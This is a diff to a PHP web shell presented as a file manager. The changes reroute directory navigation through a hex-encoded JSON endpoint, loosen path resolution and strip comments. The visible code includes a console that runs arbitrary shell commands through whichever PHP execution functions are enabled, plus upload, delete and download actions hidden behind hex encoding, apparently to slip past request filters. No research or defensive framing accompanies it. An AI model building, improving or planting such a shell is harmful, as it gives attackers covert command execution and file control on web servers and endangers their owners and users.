@@ -162,19 +162,29 @@ header('X-Frame-Options: DENY');
 header('X-XSS-Protection: 1; mode=block');
 
 // ----------------------------------------------------------------------------
-// PATH VALIDATION & SANITIZATION
+// PATH VALIDATION & SANITIZATION (Fixed for proper relative & absolute navigation)
 // ----------------------------------------------------------------------------
-function safeRealPath($path) {
-    if (strpos($path, '..') !== false) return false;
+function safeRealPath($path, $baseDir = '') {
+    if ($baseDir && !preg_match('/^([a-zA-Z]:)?[\\\\\/]/', $path)) {
+        $path = $baseDir . DIRECTORY_SEPARATOR . $path;
+    }
+    
     $rp = @realpath($path);
-    if ($rp !== false) return $rp;
-    if (@is_dir($path) || @is_file($path)) return $path;
+    if ($rp !== false && (@is_dir($rp) || @is_file($rp))) {
+        return $rp;
+    }
+    
+    if (@is_dir($path) || @is_file($path)) {
+        return $path;
+    }
+    
     return false;
 }
 
 function validatePath($path) {
     if (empty($path)) return false;
-    $rp = safeRealPath($path);
+    $current = isset($_SESSION['current_dir']) ? $_SESSION['current_dir'] : '';
+    $rp = safeRealPath($path, $current);
     if ($rp && (@is_file($rp) || @is_dir($rp))) return $rp;
     return false;
 }
@@ -232,7 +242,7 @@ function decodeHexPayload($hex) {
 }
 
 // ----------------------------------------------------------------------------
-// HEX JSON API ENDPOINT (Uploader Method for ALL write actions)
+// HEX JSON API ENDPOINT (Uploader Method for ALL write actions & Navigation)
 // ----------------------------------------------------------------------------
 $reqType = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
 $isJsonRequest = isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false;
@@ -255,6 +265,20 @@ if ($reqType === 'POST' && $isJsonRequest) {
     $currentDir = $_SESSION['current_dir'];
     
     switch ($action) {
+        case 'goto':
+            $goto_hex = isset($payload['goto_hex']) ? $payload['goto_hex'] : '';
+            $targetDir = decodeHexPayload($goto_hex);
+            if ($targetDir !== false) {
+                $vp = validatePath($targetDir);
+                if ($vp !== false && @is_dir($vp)) {
+                    $_SESSION['current_dir'] = $vp;
+                    echo json_encode(array('status' => 'success', 'message' => 'Navigated successfully'));
+                    exit;
+                }
+            }
+            http_response_code(400); echo json_encode(array('status' => 'error', 'message' => 'Invalid directory path'));
+            exit;
+
         case 'upload_hex':
             $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
             $data_hex = isset($payload['data_hex']) ? $payload['data_hex'] : '';
@@ -336,7 +360,6 @@ if ($reqType === 'POST' && $isJsonRequest) {
             $tp = validatePath($currentDir . DIRECTORY_SEPARATOR . $itemName);
             if (!$tp) { http_response_code(404); echo json_encode(array('status' => 'error', 'message' => 'Path not found')); exit; }
             
-            // Recursive delete helper for Hex API
             if (!function_exists('ax_recursive_delete_hex')) {
                 function ax_recursive_delete_hex($path) {
                     if (@is_file($path) || @is_link($path)) return @unlink($path);
@@ -389,10 +412,9 @@ if ($reqType === 'POST' && $isJsonRequest) {
 }
 
 // ----------------------------------------------------------------------------
-// STANDARD POST ACTIONS (Reads, Navigation, Console, Downloads)
+// STANDARD POST ACTIONS (Reads, Console, Downloads)
 // ----------------------------------------------------------------------------
 
-// Function Availability & Shell Execution
 function isFunctionAvailable($func) {
     if (!function_exists($func)) return false;
     $disabled = @ini_get('disable_functions');
@@ -418,7 +440,6 @@ function ax_run_command($cmd) {
 $commandAvailable = false;
 foreach ($_sh as $fn) { if (isFunctionAvailable($fn)) { $commandAvailable = true; break; } }
 
-// Recursive Walker & Archive
 function ax_walk_dir($dir, &$out, $base = '') {
     $items = @scandir($dir);
     if ($items === false) return;
@@ -464,9 +485,8 @@ function ax_build_archive($items, $baseDir, $namePrefix) {
 $notification = '';
 $errorMsg = '';
 
-// Check CSRF for standard POSTs
 if ($reqType === 'POST' && !$isJsonRequest) {
-    $_csrf_read_only = array('goto', 'show', 'modify');
+    $_csrf_read_only = array('show', 'modify');
     $needsCsrf = false;
     foreach ($_POST as $key => $v) {
         if ($key === '_csrf_token' || $key === 'items' || in_array($key, $_csrf_read_only)) continue;
@@ -477,16 +497,6 @@ if ($reqType === 'POST' && !$isJsonRequest) {
     }
 }
 
-// Navigation
-if (isset($_POST['goto'])) {
-    $targetDir = $_POST['goto'];
-    if (@is_dir($targetDir)) {
-        $vp = validatePath($targetDir);
-        if ($vp !== false) { $_SESSION['current_dir'] = $vp; }
-    }
-}
-
-// Download
 if (isset($_POST['get_file'])) {
     $tp = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['get_file']);
     if ($tp !== false) {
@@ -510,7 +520,6 @@ if (isset($_POST['get_file'])) {
     }
 }
 
-// Bulk Download
 if (isset($_POST['act_dl']) && isset($_POST['items']) && is_array($_POST['items'])) {
     $paths = array();
     foreach ($_POST['items'] as $item) {
@@ -528,7 +537,6 @@ if (isset($_POST['act_dl']) && isset($_POST['items']) && is_array($_POST['items'
     } else { $errorMsg = 'Bulk download failed: archive tools unavailable'; }
 }
 
-// Console
 $commandResult = '';
 if (isset($_POST['exec']) && trim($_POST['exec']) !== '') {
     $cmd = trim($_POST['exec']);
@@ -539,7 +547,6 @@ if (isset($_POST['exec']) && trim($_POST['exec']) !== '') {
     if (trim($commandResult) === '') { $errorMsg = 'Console: No output'; }
 }
 
-// Prepare file list
 $currentDirectory = $_SESSION['current_dir'];
 $directoryContents = @scandir($currentDirectory);
 if (!is_array($directoryContents)) {
@@ -555,7 +562,6 @@ foreach ($directoryContents as $item) {
 sort($folders); sort($files);
 $allItems = array_merge($folders, $files);
 
-// Views and Edits (Render setup)
 $fileToEdit   = isset($_POST['modify']) ? $_POST['modify'] : null;
 $fileToView   = isset($_POST['show']) ? $_POST['show'] : null;
 $itemToRename = isset($_POST['rename_item']) ? $_POST['rename_item'] : null;
@@ -703,6 +709,16 @@ $viewContent  = $fileToView ? @$fn_get_contents($currentDirectory . DIRECTORY_SE
             }
         }
 
+        function doNavigateHex(event) {
+            event.preventDefault();
+            const path = event.target.elements['goto_path'].value.trim();
+            if (!path) return;
+            sendHexPayload({
+                action: 'goto',
+                goto_hex: stringToHex(path)
+            });
+        }
+
         async function doUploadFileHex(btn) {
             const fileInput = document.getElementById('upload_files');
             const statusSpan = document.getElementById('upload_status');
@@ -834,7 +850,7 @@ $viewContent  = $fileToView ? @$fn_get_contents($currentDirectory . DIRECTORY_SE
         };
         document.addEventListener('DOMContentLoaded', function() {
             var token = getCsrfToken();
-            document.querySelectorAll('form[method="post"]').forEach(function(form) {
+            document.querySelectorAll('form[method="post"]:not([onsubmit])').forEach(function(form) {
                 if (!form.querySelector('input[name="_csrf_token"]')) {
                     var i = document.createElement('input');
                     i.type = 'hidden'; i.name = '_csrf_token'; i.value = token;
@@ -879,9 +895,8 @@ $viewContent  = $fileToView ? @$fn_get_contents($currentDirectory . DIRECTORY_SE
             </span>
         </div>
         <div class="card-body">
-            <form method="post" class="input-group">
-                <?= csrfField() ?>
-                <input type="text" name="goto" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path..." style="flex: 1;">
+            <form onsubmit="doNavigateHex(event)" class="input-group">
+                <input type="text" name="goto_path" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path..." style="flex: 1;">
                 <button class="btn btn-primary" type="submit">Go</button>
             </form>
         </div>
@@ -1008,11 +1023,7 @@ $viewContent  = $fileToView ? @$fn_get_contents($currentDirectory . DIRECTORY_SE
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                 Files
             </span>
-            <form method="post" style="display:inline;">
-                <?= csrfField() ?>
-                <input type="hidden" name="goto" value="<?= htmlentities(dirname($currentDirectory)) ?>">
-                <button type="submit" class="btn btn-ghost"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Parent</button>
-            </form>
+            <button type="button" class="btn btn-ghost" onclick="sendHexPayload({action: 'goto', goto_hex: stringToHex('<?= addslashes(dirname($currentDirectory)) ?>')})"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Parent</button>
         </div>
         <table class="file-table">
             <thead>
@@ -1062,11 +1073,7 @@ $viewContent  = $fileToView ? @$fn_get_contents($currentDirectory . DIRECTORY_SE
                         <div class="file-name-cell">
                             <div class="file-icon <?= $iconClass ?>"><?= $iconHtml ?></div>
                             <?php if ($isDirectory): ?>
-                                <a href="#" class="file-name" onclick="document.getElementById('nav-<?= $md5item ?>').submit(); return false;"><?= htmlentities($item) ?></a>
-                                <form id="nav-<?= $md5item ?>" method="post" style="display: none;">
-                                    <?= csrfField() ?>
-                                    <input type="hidden" name="goto" value="<?= htmlentities($fullPath) ?>">
-                                </form>
+                                <a href="#" class="file-name" onclick="sendHexPayload({action: 'goto', goto_hex: stringToHex('<?= addslashes($fullPath) ?>')}); return false;"><?= htmlentities($item) ?></a>
                             <?php else: ?>
                                 <a href="#" class="file-name" onclick="document.getElementById('view-<?= $md5item ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                                 <form id="view-<?= $md5item ?>" method="post" style="display: none;">
